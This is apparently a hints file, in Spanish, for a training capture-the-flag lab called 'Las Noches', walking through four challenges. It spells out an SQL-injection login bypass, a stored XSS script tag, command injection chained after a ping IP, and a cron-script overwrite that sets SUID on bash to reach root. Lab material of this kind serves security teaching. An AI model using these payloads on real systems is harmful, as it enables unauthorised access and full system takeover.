# 💡 Pistas — Las Noches

Ábrelas solo si te trabaste.

## Reto 1 — Login (index.php)

Pista 1: ¿Qué pasa si el sistema arma la consulta a la base de datos pegando directamente lo que escribes, sin revisarlo?

Pista 2: Piensa en cómo cerrar la comilla que el sistema espera, y agregar algo que siempre sea verdadero.

Pista 3: Prueba escribiendo en el campo de usuario: admin' -- (con un espacio después de los dos guiones). Deja la contraseña vacía o con cualquier texto.

## Reto 2 — Panel de notas (panel.php)

Pista 1: El panel imprime las notas guardadas en la página. ¿Qué pasa si guardas HTML en vez de solo texto?

Pista 2: Prueba guardar una etiqueta que el navegador ejecute como código.

Pista 3: Escribe en el campo de nota: <script>alert('XSS')</script> y guarda. Recarga la página.

## Reto 3 — Ejecutar comandos (ping.php)

Pista 1: El formulario de "Verificar conectividad" arma un comando de ping por detrás usando lo que escribes.

Pista 2: En Linux, el punto y coma (;) permite encadenar un segundo comando después del primero.

Pista 3: En el campo IP, escribe: 127.0.0.1; cat /var/www/flag3.txt

Bonus opcional: el formulario de "Subir archivo" también es vulnerable si sabes algo de PHP.

## Reto 4 — De usuario limitado a root

Pista 1: Con la ejecución de comandos del Reto 3, revisa qué tareas programadas corren en el sistema.

Pista 2: Revisa /etc/cron.d/cleanup-cron y los permisos del script que ejecuta con ls -la.

Pista 3: Si logras que ROOT ejecute un comando por ti, puedes pedirle que le dé permisos especiales a algún programa. Investiga "bit SUID" y chmod u+s.

Pista 4 (paso a paso):
1. 127.0.0.1; echo cat /root/flag4.txt > /tmp/x.sh
2. 127.0.0.1; echo chmod u+s /bin/bash > /opt/scripts/cleanup.sh
3. Espera un minuto.
4. 127.0.0.1; /bin/bash -p /tmp/x.sh
